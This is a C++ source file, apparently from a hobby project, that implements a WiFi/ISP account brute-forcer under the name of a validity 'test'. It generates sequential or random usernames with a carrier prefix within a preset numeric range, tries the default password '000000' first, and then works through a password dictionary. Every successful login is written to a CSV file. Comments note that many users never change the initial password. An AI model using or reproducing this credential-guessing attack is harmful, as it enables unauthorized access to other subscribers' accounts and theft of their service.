/**
 * @file CCDX_WIFI_TEST.cpp
 * @date 20.03.2024
 * @author RMSHE
 *
 * < GasSensorOS >
 * Copyright(C) 2024 RMSHE. All rights reserved.
 *
 * This program is free software : you can redistribute it and /or modify
 * it under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.If not, see < https://www.gnu.org/licenses/>.
 *
 * Electronic Mail : asdfghjkl851@outlook.com
 */

#include <iostream>
#include "WebRequests.hpp"
#include "UsernameGenerator.hpp"
#include "DictionaryIndexer.hpp"

CSV_Operations csv_op;
DictionaryIndexer dic;

/**
 * WIFI_Test 类用于测试和记录WIFI账户的有效性。
 * 它尝试连接到WIFI账户，使用预定义(默认)参数或提供参数进行尝试。
 */
class WIFI_Test {
private:
    //用户名列表的生成模式("r":随机模式; "s":顺序模式; "ir":增量随机模式;)
    std::string gen_mode;

    // 用户名列表的生成时在增量随机模式下时可用, 随机递减值的最大值通过这个参数传递
    uint64_t maxDecrement;

    // 尝试的用户名数量(生成用户名的数量)
    uint16_t amount;

    // 用户名尝试范围(最小最大值,运营商注册的账号有数字递增的特点,因此根据已知的两个有效用户名顺序生成中间用户名是一个简洁有效的方法)
    uint64_t minNum, maxNum;

    // 密码尝试次数(从密码字典中抽取密码进行尝试的次数)
    uint32_t pwdTryNum;

    // 用户名前缀(取决于运营商)
    std::string usernamePrefix;

    // 账户初始密码(取决于运营商,值得一试!)
    std::string initialPassword;

public:
    // 构造函数: 初始化测试参数
    WIFI_Test(std::string gen_mode = "ir",
              uint64_t maxDecrement = 8,
              const uint16_t amount = 1000,
              const uint64_t minNum = 8143086109,
              const uint64_t maxNum = 9390026092,
              uint32_t pwdTryNum = 100,
              const std::string &usernamePrefix = "043111",
              const std::string &initialPassword = "000000") :
        gen_mode(gen_mode),
        maxDecrement(maxDecrement),
        amount(amount),
        minNum(minNum),
        maxNum(maxNum),
        pwdTryNum(pwdTryNum),
        usernamePrefix(usernamePrefix),
        initialPassword(initialPassword) {}

    // 开始执行WIFI账户的有效性测试。
    void runTests() {
        UsernameGenerator ug(amount, minNum, maxNum);

        /**
         * 生成用户名列表;
         * @param gen_mode 生成模式("r":随机模式; "s":顺序模式; "ir":增量随机模式;)
         * @param maxDecrement 在增量随机模式下时可用, 随机递减值的最大值通过这个参数传递
         */
        ug.generateUsernamesList(gen_mode, maxDecrement);

        // 读取密码字典;
        dic.readDictionary("./Dictionary.csv");

        while (true) {
            // 从用户名列表中抽取用户名(格式:前缀+抽取的用户名)
            currentUsername = usernamePrefix + ug.extractUniqueUsernam();

            // 如果用户名已被全部抽取完,则结束循环
            if (currentUsername == usernamePrefix) break;

            system("CLS");
            std::cout << "正在尝试第 " << ++usernameNum << " 个用户名.\t" <<
                "共找到 " << effectiveAccountNum << " 个有效账户.\n" << std::endl;

            // 设置初始密码(WIFI的初始密码,很多人没有改,所以第一次密码尝试用这个成功率很高!)
            currentPassword = initialPassword;

            // 重置字典;
            dic.copyPasswordDictionary();

            for (uint32_t i = 0; i < pwdTryNum; ++i) {
                std::cout << "\r当前用户名(" << usernameNum << "/" << amount << "):" << currentUsername <<
                    "\t当前密码(" << i << "/" << pwdTryNum << "):" << currentPassword << "                ";

                WebRequests re(currentUsername, currentPassword);

                auto respond = re.login();

                if (respond[0].first == "result" && respond[0].second == "true") {
                    // 登录成功，保存有效账户信息到CSV文件
                    csv_op.appendToCSV({ { currentUsername , currentPassword } }, "./EffectiveAccount.csv");

                    // 用于统计有效账户的总数
                    ++effectiveAccountNum;
                    break;
                }

                // 从密码字典中抽取密码
                currentPassword = dic.extractUniquePassword();

                // 如果密码已被全部抽取完,则结束循环
                if (currentPassword == "") break;
            }
        }
    }

private:
    uint32_t usernameNum = 0;                       // 用于记录已经尝试过的用户名数目;
    uint32_t effectiveAccountNum = 0;               // 用于记录有效账户数;
    std::string currentUsername, currentPassword;   // 当前正在尝试的用户名和密码;
};

int main() {
    tl.displayInfo();       // 显示版本信息

    tl.displayDictionary(); // 显示字典内容

    WIFI_Test test;     // 初始化测试参数

    test.runTests();    // 运行测试

    system("pause");
    return 0;
}

/*

// CSV文件"创建-写-读-删除-存在性"测试;

std::vector<std::vector<std::string>> Invalid_Username;
for (int i = 0; i < 100; ++i) {
    Invalid_Username.push_back({ ug.randomGenerate() ,{ std::to_string(i) } });
}

csv_op.appendToCSV(Invalid_Username, "./Invalid_Username.csv");
std::vector<std::vector<std::string>> data = csv_op.readFromCSV("./Invalid_Username.csv");

for (auto &i : data) {
    for (auto &j : i) {
        std::cout << j << "\t";
    }
    std::cout << "\n";
}

std::cout << csv_op.isFileExists("./Invalid_Username.csv") << std::endl;

csv_op.deletePath("./Invalid_Username.csv");

std::cout << csv_op.isFileExists("./Invalid_Username.csv") << std::endl;

*/

/*

// 密码字典"读取-拷贝-随机化-抽取"测试;
for (auto &i : dic.readDictionary("./Dictionary.csv")) {
    std::cout << i << std::endl;
}

std::cout << "------------------------" << std::endl;

while (true) {
    std::string pwd = dic.extractUniquePassword();
    std::cout << pwd << std::endl;

    if (pwd == "")break;
}

*/

/*

// 用户名"生成-拷贝-抽取"测试;
// 生成用户名列表;
ug.generateUsernamesList("s");

while (true) {
    std::string use = ug.extractUniqueUsernam();
    std::cout << use << std::endl;

    if (use == "")break;
}

*/